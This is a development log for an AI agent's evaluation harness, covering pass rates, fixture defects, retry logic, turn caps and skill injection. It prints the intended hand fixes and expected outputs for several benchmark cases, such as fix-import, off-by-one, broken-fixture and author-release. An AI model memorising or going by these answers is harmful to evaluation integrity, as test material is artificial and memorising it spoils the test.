spawn() sets AGENT_WORKSPACE and AGENT_HOME; it did not - it only kept them out
of the `-e` forwarding, and `--env-file` is a different path. Every scored
container took the host's `D:/agent-workspace` and reported setup-failed.
spawn() now sets both explicitly and a test asserts the command contains them.

### Cost

Image **594 MB -> 1.61 GB**. Paid per scored run in disk and container start,
not in tokens. `AGENT_SEMANTIC_RECALL=off` reverts the behaviour in one line;
the image is the part that does not revert.

---

## FR-408's gate fired: keyword recall is 0/40 on a corpus it has never had (2026-09-04)

Phase 1 of the FR-408 plan. No code changed; a corpus was built and measured.

| | recall@3 |
|---|---|
| verbatim, query == goal | **40/40** |
| overlapping, one shared rare word | **10/10** |
| **paraphrase, no shared words** | **0/40** |

Three directions on purpose. 0/40 alone has two explanations and only one is a
finding: the first two rows rule out "retrieval is broken" and "the benchmark is
merely impossible", leaving vocabulary as the only variable.

### Why the old measurement said 5/6

The 36-goal corpus was coding-repair tasks phrased alike, so a query shared rare
words with its target and keyword sufficed. Row 2 above REPRODUCES that: give a
query one overlapping rare word and keyword scores 10/10 on this corpus too.

A personal agent's memory is not worded that way:

```
query : how do I like my morning drink
wanted: I take my coffee black, no sugar.
got   : Sourdough starter gets fed Friday mornings.

query : when should I send Priya a card
wanted: My sister's birthday is the 14th of March.
got   : Renewed the library card.                     <- matched on `card`
```

### The corpus

`eval/fixtures/recall-corpus.jsonl`: 170 episodes, 40 with a ground-truth query.
Distractors are written rather than harvested - the 45 distinct recorded goals are
nearly all "Make the suite pass", which is no distractor set at all. Checked before
measuring: no pair shares a word with its query except stopwords like `the`, which
document frequency drops.

### What this does NOT say

It says keyword fails on vocabulary. It does not say embeddings succeed. The
four-lane shape measured 1/6 and a dense lane alone 3/6, and both stay rejected.
Phase 2 has to move recall@3 on THIS corpus or it reverts like everything else.

---

## authoring re-measured on the committed defaults: 11/11 (2026-09-04)

Confirmation run, no code change. Extraction on by default, caps back at 12,
`author-release` winnable.

```
author-deps       2/2      the 12th run was interrupted, not a result
author-errors     3/3
author-release    3/3
author-testname   3/3
```

| | score |
|---|---|
| historic real arm | **3.3%** (n=60) |
| + extraction, caps 24 | 8/12 |
| + extraction, caps 12 | 9/12 |
| **+ fixture fix** | **11/11** |

**11/11 is what completed.** The last case-run was killed by an interrupt and never
produced a row, so the denominator is 11 - quoting 12/12 would be inventing a result.

Two causes, both things this project already knew and neither a new mechanism: `learn`
asked and was answered 3 times in 117 runs, where extraction fires by rule 12 of 12;
and one case demanded an output its own CONVENTIONS.md never specified, with the
correct wording sitting in `qz-release/SKILL.md` in the same repository.

---

## author-release was unwinnable: the rule did not determine the check (2026-09-04)

**0/9 -> 3/3.** The only change is four words in a fixture.

The agent had been getting it half right for nine runs:

```
VERSION      4.14.0-quartz          correct
CHANGES.md   rel 4.14.0 :: ...      check wanted rel 4.14.0-quartz :: ...
```

CONVENTIONS.md said:

```
- `VERSION` holds the version with a `-quartz` suffix ...
- `CHANGES.md` gains one line at the end, exactly `rel <version> :: <summary>`.
```

Scoping the suffix to VERSION in the first bullet and then writing `<version>`
plainly in the second makes the plain form the natural reading. The agent followed
the rule as written and the check rejected it.

**The proof was already in the repo.** The `skills` split states the SAME convention
unambiguously - `qz-release/SKILL.md` says `rel <version-with-suffix> :: <summary>`
with a worked example. The authoring fixture had dropped the disambiguation its own
sibling carried. CONVENTIONS.md now matches it.

The example summary is `parser rewrite`, deliberately none of the three session
summaries: a fixture must not hand over its own answer.

### The history of this case is not comparable across this change

Every `author-release` result before 2026-09-04 was scored against a rule that could
not produce the required output. It was 0/9 in the three-arm extraction comparison
and dragged that split's ceiling to 9/12; the ceiling is 12/12 from here.

**A fixture must not contain its own answer, and it must also STATE one.** The
three-way check catches the first and says nothing about the second - untouched fails,
a plausible answer without the knowledge fails, and the correct answer passes, all
true here while the case remained unwinnable.

---

## authoring 3.3% -> 9/12, and the control beat the treatment (2026-09-04)

| arm | cap | extraction | score |
|---|---|---|---|
| A | 24 | off | 4/12 |
| B | 24 | on | 8/12 |
| **C** | **12** | **on** | **9/12** |

```
                   A(24,off)  B(24,on)  C(12,on)
author-errors        0/3        3/3       3/3
author-deps          1/3        3/3       3/3
author-testname      3/3        2/3       3/3
author-release       0/3        0/3       0/3
```

**Extraction is the entire effect and the cap raise is worse than neutral.**
`author-errors` is the discriminator: 0/3 without extraction, 3/3 with it at EITHER
cap. `author-testname` scores 3/3 at cap 12 and 2/3 at cap 24 - the extra turns gave
it room to spoil a correct answer, the same over-editing that cost float-division on
held out. The caps are reverted.

### Why extraction works where `learn` did not

| | fired |
|---|---|
| `learn` tool (the agent chooses) | **3 of 117 runs** |
| extraction (a rule at session end) | **12 of 12** |

`authoring` is a THREE-SESSION case: session 1 says "read CONVENTIONS.md, then cut
release 4.12.0", sessions 2 and 3 name no convention. The agent has to record what it
learned or start blind. It almost never chose to, so the split sat at 3.3% while every
part of the machinery worked.

Third time deterministic injection has beaten agent choice here, after
write_episode -> context_for (0/18 -> 15/18) and the skill index.

### Two things I read wrong on the way

`skills_loaded=[]` is a load_skill TOOL-CALL counter, not "the skill never reached the
model". The auto-skill was injecting the body into the system prompt every turn
(`skill_opened` 19, 13, 20) while I argued twice that it had not fired. Check the trace,
not the tool counter.

`best_match` was verified against the FULL skills library, which authoring cases never
see - they get `skills-empty` and must write their own. That check said nothing about
the split it was cited for.

---

## Three numbers this project was quoting were wrong (2026-09-04)

No code changed. Reading the traces to PLAN the remaining work corrected the record,
and the corrections change what the work is.

### recall and skills were never broken

| split | ablation (capability OFF) | real arm |
|---|---|---|
| `recall` | 0.0% (n=18) | **85.7%** (n=21) |
| `skills` | 8.6% (n=35) | **94.4%** (n=36) |
| `authoring` | 47.8% (n=23) | **3.3%** (n=60) |

`recall 46%` and `skills 52%` averaged a deliberate control arm into the headline. The
control was doing its job - memory off scores 0%, skill loading off scores 8.6% - and
averaging it in made a working capability read as a gap. Quoted for days, including in
CLAUDE.md, against this project's own rule about partial denominators.

**The personal half is one split, not four, and it is worse than reported: authoring at
3.3%, not 16%.**

### The no-edit bucket was two failures wearing one label

| split | before | after |
|---|---|---|
| `real` | 46 of 72 (64%) | **1 of 18** |
| `dev` | 31 of 59 (53%) | **0 of 0** - last run 15/15 |
| `authoring` | 6 of 67 (9%) | never had it |
| `search` | 9 of 9 (100%) | correct behaviour |

`real` and `dev` were runs cut off by the turn cap, and both cleared. `search` cases are
QUESTIONS: not editing is the right answer there, and its 100% is a different thing with
the same name. Aggregating the bucket across splits produced a 37.6% figure that pointed
at no single fixable cause.

### The auto-skill has never been measured

`skills.opening()` shipped in 254215f and 165 of 168 authoring/skills runs predate it.
Zero `skill_opened` trace events exist anywhere. The matcher is correct offline - 9 of 10
fixture goals match the right skill - so it is unmeasured, not broken.

The effect it targets is still the largest in the corpus: a run that loaded a skill
passes **95.8%** (n=48), one that did not passes **10.0%** (n=10).

---

## real 10/17, and the no-edit bucket is gone from it (2026-09-03)

The measurement the previous cycle owed. `real` cases already carry
`max_turns=30`, so the cap raise did not touch them - the docstring fix is the
only change since this split was last measured.

| | before | now |
|---|---|---|
| pass rate | **22%** (92 runs) | **10/17** |
| invented a tool | 12% (11/92) | **2 of 18** |
| never edited anything | **64%** (46/72) | **1 of 18** |

```
real-cachetools       3/3        real-click      1/3
real-markdown         3/3        real-rich       1/3
real-more-itertools   2/3        real-humanize   0/3
```

All six cases measured, three runs each. The previous 4/10 rested on four of six
and CLAUDE.md flagged it; this does not.

### What the number is NOT

This is not a controlled A/B. The baseline is pooled across many configurations,
and this run is the first with `MAX_TURNS=30` as the config default - the case
cap was already 30, but an interaction cannot be ruled out. The honest claim is
**10/17 with the docstring fix in place**, not "the fix caused +37 points".

### real-humanize changed shape without changing outcome

| | before (n=35) | now (n=3) |
|---|---|---|
| made zero edits | 26 | **0** |
| died on `failures >= 3` | 26 | 1 |

All three runs now edit and die on `budget` at 341-411k tokens instead of being
killed by denial cascades at 7-22 turns. Still 0/3, and 1 pass in 13 runs across
six configurations - consistent with the case turning on arithmetic the model
gets wrong, which no prompt fixes.

---

## A severed stream was scored as a failed case (2026-09-03)

A run interrupted mid-stream wrote `status: ok, turns 0, tokens 0` and counted
against the score. `RemoteProtocolError: peer closed connection without sending
complete message body (incomplete chunked read)`.

The SDK wraps httpx on a normal request, but a stream fails while it is being
ITERATED - after `create()` returned - so httpx raises through unwrapped and
`RETRYABLE` never saw it. A transport abort has no HTTP status because the SDK
never saw a response.

A type list AND a substring list, because the exception can arrive wrapped in
something whose name no longer says transport. Both are here.

**What was deliberately NOT taken** is the structural rule "no HTTP status
means transport". A `TypeError` in our own code has no status either, and
excusing a real defect as an outage costs more than one mis-scored row. The
harness scores a crashed agent ON PURPOSE ("a crashed agent IS a result"), so
the fix belongs upstream in the classifier and nowhere near that branch.

### The mutation that mattered

T1 - deleting the entire type list - PASSED at first. The severed-stream test's
message contained "incomplete chunked read", so the substring fallback caught it
and the names were doing nothing. A second test uses transport type names with
NO marker in the message; T1 now fails. Fifth time this shape has appeared: a
test that passes for the wrong reason.

---

## The model was inventing tools that do not exist (2026-09-02)

**Hypothesis:** nothing tells the model how to LIST a directory, so it invents
`ls`. **Change:** `run_shell`'s docstring, which said only "Use this to run
tests", now says it is for looking around too; `search_files` stops claiming
`ls` and `find`, which contradicted it. **Result:** mechanism confirmed, pass
rate unmeasured. **Status: kept, and the pass-rate half is still owed.**

### The discriminator

| | n | pass |
|---|---|---|
| never invented a tool | 636 | **65.3%** |
| invented one | 88 | **34.1%** |

A 31-point gap across the whole corpus. The invented names are shell commands
arriving as TOOL names - `ls` 70, `grep` 14, `find` 11 - plus mangled variants
(`'ls -la'`, `grep ... </parameter`) that are the same three commands with
arguments crammed into the name field. 81 of 108 are clean identifiers, so this
is an affordance gap and not a parser bug.

CLAUDE.md already records the earlier half: 67% of `run_shell` was doing
`search_files`'s job via 1,266 `find`, 755 `grep`, 708 `ls`. Those went THROUGH
run_shell. These escape it.

### Measured on authoring, and that was the wrong choice

| author-release | n | pass | invented |
|---|---|---|---|
| before | 21 | 2/21 (10%) | **14/21 (67%)** |
| after | 3 | 0/3 | **0/3** |

Invention went 67% -> 0% and the case still failed, because `author-release`
never failed on directory listing - it fails on applying the `qz-release` skill.
authoring was picked for having the HIGHEST invention rate, not for its failures
being CAUSED by invention. Those are different things, and conflating them is
the same error as measuring `_noop_nudge` on a split where its mode is rare.

The split where a denied call actually costs the run is `real`: 10 of 15 no-edit
`stuck` runs there die on `failures >= 3`, with `ls`/`grep`/`find` among the
denials. That measurement is still owed.

### Two hypotheses killed before any code was written

| claim | measured |
|---|---|
| context flood on real repos | `max_result_chars` median 4,784, worst 11,340 - shrink is working |
| re-reading the same file | duplicate reads median **0** on both passes and failures |

---

## MAX_TURNS was the binding failure, not the model (2026-09-01, late)

| | dev | held out | `stuck` |
|---|---|---|---|
| cap 12 | 13/15 | - | 33% |
| **cap 30** | **15/15** | **29/30** | **0%** |

45 scored runs, 4 blocked and excluded. Zero `stuck` verdicts anywhere, against 25%
historically. Median 42-54k tokens of a 200,000 budget, so nothing ran away - the
constraint moved from turns to tokens, which is what the derivation predicted.

### The evidence is a run, not a rate

Four runs went past the old 13-turn ceiling:

```
missing-return-2    31 turns   PASS
missing-return-0    30 turns   PASS
add-endpoint-2      15 turns   PASS   first edit on call 13
circular-import-0   15 turns   PASS
float-division-2    24 turns   FAIL   over-edited into a broken pyproject.toml
```

`add-endpoint-2` made its first edit on call 13 - impossible under the old cap. That
is the mechanism, not an inference from a pass rate.

### Held out is a TIE and is reported as one

29/30 before and after. Three runs gained the room they needed, one used it to break
itself. The dev gain is real; the held-out gain is zero.

### 12 was a fixture-era cost control

Comparable agents cap a parent at 200-500. 30 is derived: at ~4.4k tokens a turn the token budget
binds around turn 45, so 30 keeps BUDGET_TOKENS the real ceiling.

### Three hypotheses the corpus killed

Each came from ONE traced run and each was refuted by the recorded corpus:

| | claim | measured |
|---|---|---|
| `_noop_nudge` | `done` with 0 edits | fired **0 of 30** |
| `_drift_notice` | long read streak | fired **1 of 15** |
| skill leak | `qz-testnames` poisons coding cases | **82%** pass contaminated vs **71%** clean |
| verification ledger | ignored a green suite | **7 of 279**, 6 of them correct behaviour |

`float-division-2` really was destroyed by `qz-testnames`: it ran `pytest -k check_` at
call 2 before reading anything, fixed the real bug at call 7, saw all 8 tests pass at
call 9, and then spent 14 turns reconfiguring `pyproject.toml` to match a convention
belonging to a different fictional project. The mechanism is real in that run and absent
across 525 others.

### What is still open, with 105 runs behind it

**37.6% of all failures never edit a single file** - 105 of 279. 62 end `stuck`, 25
`done`, 13 `compact`. `_noop_nudge` was aimed at exactly this and placed in the `done`
branch, so it covered 25 of 105 and fired never. The idea was sound; the placement made
it dead code.

---

## Two guards built for measured failures, both inert, both reverted (2026-09-01)

dev 13/15 -> 13/15. Nothing moved, so nothing is kept. 669 -> 655 tests.

| guard | built for | fired |
|---|---|---|
| `_noop_nudge` | `done` reached with 0 edits | **0 in 30 runs** |
| `_drift_notice` | a long read streak with no write | **1 in 15** |

### exploration-drift did not transfer, and the reason is the shape

A borrowed design. Its threshold is 25 read-only calls in an UNBOUNDED turn,
written for 167 sequential bash calls with no user-facing text. Rescaled to 8
against our 13-turn cap - and it still almost never
fires, because `run_shell` is write-risk and ends the streak, and this agent runs
pytest every few calls:

```
run_shell run_shell run_shell read_file run_shell read_file x3 ...   streak 3
search_files x2 read_file run_shell run_shell search_files x5 ...    streak 6
```

Rescaling the NUMBER was not enough; the interleaving is different in kind. A
threshold that fires once in fifteen runs cannot move a pass rate, and the number
confirms it did not.

### The signal that was measured and then not used

Across 9 `add-endpoint` runs the correlation was perfect: **every failure made 0
edits in 13 calls, every pass made at least one.** The detector shipped was keyed on
read-streak LENGTH instead, because that is the conventional shape. Reading
someone else's design is right; letting it choose the signal over one already
verified here is not.

### What the traces point at instead

Passing runs make their first edit at call 9-13 of a 13-turn cap - finishing just in
time - and failures are on the same trajectory having run out. Tokens agree: 53-60k
of a 200,000 budget, so these runs are starved on TURNS, not spending badly. The cap
is the next single change to test, and CLAUDE.md's own warning applies in reverse
here: check whether the run is starved BEFORE raising a cap, and this one is.

### add-endpoint is not a guard

1/3, 3/3, 1/3, 1/3, 1/3 across five runs on code that differed by one flag. It has
never been reliably 3/3. Anything that reads 15/15 as a stable dev baseline is
reading noise.

---

## The retry that was never wired, and a nudge turned back off (2026-09-01, later)

649 -> 662 tests. Three measured dev runs, 45 scored rows, 0 blocked in the last two.

### Why six launch attempts had produced zero scored runs

Not the endpoint. `RETRYABLE` in `provider.py` listed five exception names, and
NOTHING EVER RETRIED THEM - the classification had been added, the retry had not.
The SDK's own `max_retries` does not cover a bare `APIError`, which carries no
`status_code`; a mid-stream overload arrives exactly that way, and the file's own
comment already said three `real-humanize` runs were scored 0/3 for it.

The tell was in the timings: every failure returned in 0.2-0.3s, too fast for three
attempts with backoff.

| | survived | wall clock |
|---|---|---|
| before | **15/20** | 57s |
| after | **20/20** | 88s |

75% per call is 0.3% over a 20-turn run. `call_model` now retries
`ProviderUnavailable` six times with jittered backoff, sized for this endpoint:
a base of 5s and a cap of 120s suits a rate limit, and this one bounces back in
about a second.

It does NOT retry a stream that already emitted tokens (the second attempt would
repeat them into the transcript), nor `MalformedToolCall` (a real result that must
be scored) nor `ProviderMisconfigured` (asking again cannot supply a key).

### VERIFY_ON_STOP back OFF - kept

Turned on the previous cycle on the strength of 637 rows where 47% of failures ended
on an unverified edit. The evidence was real and the remedy was wrong.

| | dev | done | stuck |
|---|---|---|---|
| historic (n=222) | 15/15 | 73% | 25% |
| ON | **12/15** | 53% | **47%** |
| OFF | **13/15** | 67% | 33% |

Others have reached the same place from real use rather than from a number,
shipping the equivalent off and migrating existing
installs because "the verification narrative was more noise than signal". Reading
their default answered in minutes what a tuning cycle had cost a day.

### _noop_nudge - shipped UNMEASURED, and that is the finding

`broken-fixture` run 1 made five tool calls - `read_file`, `search_files` x3,
`read_file` - and declared `done` with the suite red. `_verify_nudge` cannot see it:
nothing was edited, so `edited_unverified` was never set. A verify-on-stop
design keyed on edited paths has the SAME blind spot by construction, so
borrowing one would not have helped; the usual cover for this is
`trailing_continue_intent`, a regex on the message tail.

`policy.risk_of` gives a better signal than a regex here - it already classifies MCP
and skill tools - so the check is "did any write-risk tool ever get called".

**Derived from the message history, not carried in the state.** The first version
added a `mutated: bool` field and broke 17 tests. Deriving it from history
content means a rewritten message array cannot invalidate it; here the
argument is sharper still - a thread resumed from a checkpoint written before this
existed has no such key and would nudge on every resume. Dropping the field fixed 13
of the 17 failures outright.

**It fired 0 times in the next 15 runs.** It is tested, mutation-checked four ways,
and has produced no measured effect. Kept only because the mode it targets was real
when observed; it is one honest step from `learn`, which was called 0 times in 15
sessions, and should be reverted if a later run still never fires it.

### add-endpoint is not a guard

Three runs today on identical code: 1/3, 3/3, 1/3. Its full history is
2/3 3/3 2/3 1/1 1/3 3/3 2/3 2/3 3/3. All three failures today hit the 13-turn cap
having written files, so the new nudge never fired on them.

**The 15/15 headline was a favourable draw on a flapping case.** "15/15 -> 12/15"
overstated the regression; the honest guard is 4 of 5 dev cases at 3/3 with
`add-endpoint` reported as variable.

### Process, recorded because it cost an hour

Two harnesses ran at once - a `nohup` launch that Git Bash's `ps` did not show
(Windows processes need `ps -W`), so the "relaunch" was a second driver. Each waited
on the other's container. Later the harness was piped through `head -25`, which
SIGPIPEs it mid-case; the standing lesson names `tail` and `timeout`, and `head` is
the same defect. Both left orphaned containers.

---

## The agent was told it fixes broken code, on every task (2026-08-31)

640 -> 649 tests. No quota. Two changes, both aimed at the half of this project
that had never been tuned.

### The split nobody was looking at

| | | |
|---|---|---|
| personal | `authoring` | **15%** |
| | `authoring-tiny` | **14%** |
| | `recall` | **46%** |
| | `skills` | **52%** |
| web | `web` | 100% |
| | `search` | 50% |
| code | `heldout` | 97% |
| | `multibug` | 90% |
| | `dev` | 74% |
| | `real` | 21% |

**33 of the 59 eval cases are not coding.** The rig already covers an all-rounder;
the project had only ever been aimed at the coding half - and CONTEXT.md 1 says
the repo-repair pass rate IS the headline number, which is the spec doing the
narrowing.

### 1. The posture split

`SOUL.md` opened with *"You fix broken code"* and was sent on EVERY task,
including the recall cases where the user states a deploy key and the authoring
cases where a standing rule should be learned.

It now opens *"You are a personal agent working for one person"*, and the coding
brief lives in `prompts/CODING.md`, appended only when the workspace looks like
source someone maintains - a project manifest, a `tests/` directory, a `.git`.

Two files rather than a profile registry, because there are two postures and
the brief is injected in only one of them.

`is_code_workspace()` is deterministic, one level deep, and FAILS TO GENERAL on an
unreadable workspace - guessing "coding" tells a personal request to run pytest.

### 2. The matching skill is OPENED, not offered

The measured cause of 15%, from 22 authoring runs that had a skill in the index:

```
agent called load_skill : 13 runs   passed 12, failed 1
agent did NOT           :  9 runs   passed  1, failed 8
```

**92% against 11%, decided by whether the model elected to open a file it had
already been told about** - and it elected to in 59% of runs. The extraction
worked, the index was there. The DECISION was the defect, which is this project's
oldest lesson: deterministic injection works, agent choice does not. `learn` asked
and was called 0 times in 15 sessions.

Other designs do not rely on that choice - skills loaded by slash command, or
explicit loaded-skill markers - and both have a human in the loop; our authoring cases need autonomous recall, which is a MEMORY problem
- and memory injection is the thing this project already measured at 0/18 -> 15/18.

Bodies are 421-624 bytes, less than one tool result. Matching reuses the
rarest-word scoring that took memory recall 2/6 -> 5/6, and refuses on a tie or no
rare overlap: injecting the WRONG skill is worse than injecting none, because the
agent then follows a convention that does not apply. Swept over the fixture
library: **9/9, including all three goals where it correctly injects nothing.**

A three-character floor, not four: `len(w) > 3` dropped `cut`, `tag` and `txt`, so
"Cut release 4.14.0" shared one rare word with the release skill, tied, and got
nothing. Four scores 6/9 and mismatches twice.

### ALL THREE mutations passed the first time

| mutation | first | after fixing the tests |
|---|---|---|
| 4-character floor | **passed** | 1 failed |
| inject on a tie | **passed** | 1 failed |
| never open the skill | **passed** | 1 failed |

Every one was a test of mine that could not fail:

- The tie test used TWO skills, so the shared word appeared in 2 of 2, exceeded
  the furniture ceiling, and was dropped before the tie branch was ever reached.
  It returned None for the wrong reason. Six skills now.
- The floor test also shared `release`, a long word, so it matched either way.
  The words it shares are now three letters and nothing else.
- Nothing asserted the body reaches the SYSTEM PROMPT - only that `opening()`
  returns it - so deleting the graph wiring left every test green.

That is the sixth time today, and the pattern is the same each time: a test that
asserts the right property against a fixture too small to exercise it.

### Unmeasured

Six behaviour changes are now stacked without a scored run. This one has a
falsifiable prediction, which the others do not: it should move `authoring` and
`recall`, and leave `dev` alone.

---

## Rig verification (Phase A)

Measured in the container (`python:3.12-slim`, pytest 9.1.1, flask 3.1.3),
`--network none`, workspace as the only writable mount.

Every case's check command is `cd /workspace && pytest -q --continue-on-collection-errors`.
**The flag is required, not cosmetic**: without it pytest prints
`Interrupted: N errors during collection` and stops, so a correctly-broken project and a
misconfigured `pythonpath` produce identical output and the health signal is lost.

| Case | Broken: intended failure | Broken result | Exit | Hand-fixed | Exit |
|---|---|---|---|---|---|
| `fix-import` | `ImportError: attempted relative import beyond top-level package` (collection of `tests/test_parser.py`) | 13 passed, 1 error | 1 | 18 passed | 0 |
| `add-endpoint` | `assert 405 == 201` in `test_create_item` | 3 failed, 14 passed | 1 | 17 passed | 0 |
| `off-by-one` | `assert 2 == 3` in `test_moving_average_length`, plus 4 more across two files | 5 failed, 10 passed | 1 | 15 passed | 0 |
| `broken-fixture` | `AttributeError: 'NoneType' object has no attribute 'set'` in `test_store.py` bodies | 5 failed, 3 passed | 1 | 8 passed | 0 |
| `missing-dep` | `ModuleNotFoundError: No module named 'tabulate'` (collection of `tests/test_render.py`) | 11 passed, 1 error | 1 | 13 passed | 0 |

Hand fixes applied for the flip check:

| Case | Fix |
|---|---|
| `fix-import` | `from ..errors` → `from .errors` in `ledger/parser.py` |
| `add-endpoint` | add a `POST /items` route to `app/routes/items.py` |
| `off-by-one` | `range(len(seq) - size)` → `range(len(seq) - size + 1)` in `windows/sliding.py` |
| `broken-fixture` | `yield` → `yield s` in `tests/conftest.py` |
| `missing-dep` | `pip install tabulate` (offline, from `/wheels`) |

### Notes on why each failure is the *intended* one

- **`add-endpoint` returns 405, not 404.** `/items` is a registered URL for GET, so Flask answers a
  POST with Method Not Allowed. This is a better signal than 404: it says the route exists but the
  method is unwired, which is exactly the bug.
- **`off-by-one` fails in two files from one root cause.** `test_sliding.py` and `test_stats.py` both
  break because `stats` is built on `sliding.rolling_window`. A two-patch "fix" still passes the
  check; the trace shows whether the agent found the shared cause.
- **`broken-fixture` fails at runtime, not collection.** The test module imports fine; the fixture
  hands back `None`. The bug is in test infrastructure, not in `kvstore/`.
- **Every project carries `pythonpath = ["."]`** in its `pyproject.toml`. Proven load-bearing: with
  the line removed, `fix-import` goes from `13 passed, 1 error` to `3 errors` and nothing passes.

### Verification traps found and closed

1. Verify with bare `pytest`, never `python -m pytest` — the `-m` form silently inserts the working
   directory into `sys.path`, masking a missing `pythonpath`.
2. Container pytest is pinned to the same major as the development host, so host-side
   pre-verification stays a valid proxy for the scored environment.

---

## Cycles

_(none yet — the baseline is recorded in README.md at Phase D)_

---

## Rig verification, part 2 — harness (Phase A, tasks A5/A6)

| Check | Result |
|---|---|
| `python eval/harness.py --split dev` | `pass 0/5`, exit 0 |
| Container isolation | tabulate installed in container 1, **absent** in container 2 |
| Determinism | full suite run twice, `summary.jsonl` results identical |
| Trace files | 5 per-case JSON + `summary.jsonl`, all readable, check output captured in `note` |

### Bug found by the end-to-end run

`python eval/harness.py` puts `eval/` on `sys.path`, **not** the project root, so `import agent`
raised `ModuleNotFoundError` inside the container and all five cases wrote no row. Earlier manual
checks used `python -c`, which *does* add the working directory, and had masked it.

Two fixes:

1. `harness.py` inserts `REPO` into `sys.path` at import time — chosen over `PYTHONPATH` in the
   image so the harness works under every invocation, host and container alike.
2. `outer()` now returns **1** when rows are missing. `pass 0/5` is the *expected* Phase A result
   and must exit 0; a rig that produced no rows at all must not look identical to it.

### Isolation test caveat

Running `missing-dep` twice through the harness proves nothing while the agent is null — it installs
nothing, so the case fails twice regardless. Isolation was instead proven directly: install
`tabulate` in one container, confirm it is absent in the next. Re-run the harness-level version once
the real agent lands in Phase B.

---

## API-surface verification (Phase B, task B1)

Pinned: `anthropic==0.122.0`, `langgraph==1.2.11`, `langgraph-checkpoint-sqlite==3.1.1`.

| Question | Answer | Consequence |
|---|---|---|
| `interrupt` / `Command` import path | `langgraph.types` — as assumed | gate node unchanged |
| `StateGraph` / `START` / `END` | `langgraph.graph` — as assumed | wiring unchanged |
| `compile()` accepts `checkpointer=` | Yes | resume story intact |
| **Is `SqliteSaver.from_conn_string` a context manager?** | **Yes** (`__wrapped__` present) | **The plan's wiring was wrong.** Using it for a module-level `app` would close the connection immediately |
| Direct construction | `SqliteSaver(conn: sqlite3.Connection, *, serde=None)` | Build the saver from a long-lived connection instead |
| Does it need `.setup()`? | No — tables are created on demand | Verified by a real put/get/resume cycle |

### Consequence: the graph is built lazily

`SqliteSaver` needs a live `sqlite3.Connection`, but opening one at import time is module-level I/O
(CE-05) — it would create `.agent/state.db` merely by importing `agent.graph`, including from every
test. So the graph is built by an explicit `get_app()` factory rather than a module-level `app`
constant, and `eval/harness.py` calls it. Chosen over a lazy module `__getattr__` because explicit
beats clever for something this load-bearing.

### Containerfile mistake worth remembering

Patching the Containerfile with a regex silently deleted the `pytest`/`flask` install line — and the
build still succeeded, because nothing in the build validates that pytest exists. It would have
surfaced later as every practice project failing for an unrelated reason. **Rewrite small config
files whole; do not regex-patch them.**

---

## Phase B build notes (tasks B2-B7)

87 tests pass in the container with **no network and no API key**.

| File | Tests | Covers |
|---|---|---|
| `test_policy.py` | 33 | path confinement incl. symlinks, danger escalation, mode downgrade, purity |
| `test_context.py` | 8 | caps, spill, instructions, content-addressing, no import-time I/O |
| `test_reflect.py` | 18 | every verdict branch **and their precedence** |
| `test_nodes.py` | 28 | gate / execute / finish, the three tools, and the whole loop offline |

### Two framework surprises, both caught by tests rather than by reading docs

1. **LangGraph injects the config by TYPE ANNOTATION, not by parameter name.** Nodes written as
   `def act(state, config_: dict)` raised `TypeError: act() missing 1 required positional argument`.
   Renaming to `config` was not enough — the parameter must be annotated `RunnableConfig`
   (importable from `langgraph.types`). Because `config` is also this project's settings module, it
   is now imported as `from agent import config as settings` inside `graph.py`.
2. **`SqliteSaver.from_conn_string` is a context manager**, so it cannot back a module-level `app`.
   The graph is built by `get_app()` from a long-lived `sqlite3.Connection`; no `.setup()` needed.

### The loop is proven without spending anything

`tests/test_nodes.py` drives the real compiled graph against a stand-in model that replays scripted
turns. It works with no production hook because `act` constructs its client *inside* the node, so a
test can replace `anthropic.Anthropic` wholesale. Nine scenarios are covered: the happy path, the
text-only preamble that must not terminate the run, a denied call the loop recovers from, a tool
exception, thrash detection, the turn cap, budget exhaustion, trace capture, and checkpoint resume.

### Harness degrades correctly with no credentials

With no API key the agent raises during `act`; the harness records a failed case with the reason
kept in `note` and still writes a full trace row. A missing key looks like a failed case, never
like a silent pass.

### Still open

`prompts/SOUL.md` ships with verify-loop guidance (items 3 and 4) **by explicit choice**, against
the plan's default of starting bare. Those two lines are a starting assumption, not a measured win.
If a tuning cycle has nothing better to test, remove them and measure.

---

## Provider adapter (Phase B, task B8)

96 tests pass in the container with no network and no API key.

`agent/provider.py` now holds the single seam every model call goes through:
`call_model(messages, system, tools, on_text) -> Reply`. Two implementations sit behind it —
Anthropic's native API, and any OpenAI-compatible endpoint (NVIDIA NIM by default, chosen because
its key is free with no card and no expiry, and it supports function calling).

**This earns the module its own file.** The code-economy rule needs two callers OR two
implementations before a module is justified; while there was only Anthropic, the adapter correctly
lived inside the `act` node. The second implementation is what changed that. It also turns
"the provider is swappable" from a claim into something exercised: `AGENT_PROVIDER=anthropic` flips
back with no code change.

### The internal message shape did not change

Everything outside `provider.py` still speaks Anthropic-style content blocks. The state shape is
fixed by spec and every node, test and trace already uses it, so the OpenAI-shaped provider
translates at its own boundary and nowhere else. `agent/graph.py` no longer mentions `anthropic` at
all.

### The translation that would have broken a naive port

| Direction | Ours | Theirs |
|---|---|---|
| Tool schema | `{name, description, input_schema}` | `{type: "function", function: {...parameters}}` |
| Assistant turn | content blocks incl. `tool_use` | `content` string **plus** `tool_calls[]` |
| Tool results | **one** user message of N `tool_result` blocks | **N separate** `role: "tool"` messages, each with `tool_call_id` |
| Arguments | a dict | a **JSON string** that must be parsed |

The fan-out is the one that bites, and it has a dedicated test asserting results are never collapsed.

### Malformed tool calls fail loudly, by design

`from_openai_message` raises `MalformedToolCall` when arguments are unparseable or not an object.
Native tool calling is a hard requirement with no fallback — the spec forbids parsing calls out of
free text — so a model that cannot do it must be obvious rather than showing up later as a
mysteriously low pass rate.

### Tests became provider-agnostic

The stand-in model now replaces `call_model`, not `anthropic.Anthropic`. The loop's behaviour is not
supposed to depend on who answered, and the tests now assert that rather than assuming it.

### Still unproven

Everything above is offline. **No model has actually been called yet.** The open question is whether
the chosen NIM model emits well-formed tool calls across a 12-turn loop; B9 Step 0 probes that before
anything is built on top of it. `meta/llama-3.3-70b-instruct` is a starting guess, not a
recommendation.

---

## Credentials and network (Phase B, follow-up to B8)

Two bugs found by asking "where does the key actually go?" — both would have wasted a live run.

1. **The harness only forwarded `ANTHROPIC_API_KEY`.** Setting `NVIDIA_API_KEY` correctly would
   still have produced the same "no API key" failure, because the variable never reached the
   container. It now forwards every provider variable by name: `AGENT_PROVIDER`,
   `ANTHROPIC_API_KEY`, `NVIDIA_API_KEY`, `OPENAI_API_KEY`, `NIM_BASE_URL`, `NIM_MODEL`.
   **By name, never by value** — a key is never written into a command line, a log or a trace.

2. **`--network none` would have blocked every model call.** Correct while nothing needed egress;
   fatal once the agent has to reach an API. See the recorded gap below.

